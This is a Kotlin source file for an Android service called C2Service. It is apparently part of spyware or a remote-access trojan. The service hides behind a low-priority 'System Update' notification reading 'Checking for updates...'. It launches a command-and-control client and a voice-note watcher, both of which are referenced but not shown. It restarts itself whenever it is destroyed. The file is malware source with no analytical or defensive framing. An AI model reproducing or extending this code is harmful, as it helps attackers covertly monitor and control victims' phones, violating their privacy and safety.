package com.sys.update

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class C2Service : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var client: C2Client

    companion object {
        @Volatile private var beaconRequested = false
        fun requestBeacon() { beaconRequested = true }
        fun consumeBeaconRequest(): Boolean {
            val r = beaconRequested
            beaconRequested = false
            return r
        }
    }

    override fun onCreate() {
        super.onCreate()
        startForeground(1, buildNotification())
        client = C2Client(this)
        VoiceNoteWatcher.start(this)
        scope.launch { client.run() }
    }

    private fun buildNotification(): Notification {
        val chId = "sys_update"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(chId, "System Update", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, chId)
            .setContentTitle("System Update")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        scope.cancel()
        val restart = Intent(applicationContext, C2Service::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            applicationContext.startForegroundService(restart)
        else applicationContext.startService(restart)
        super.onDestroy()
    }
}
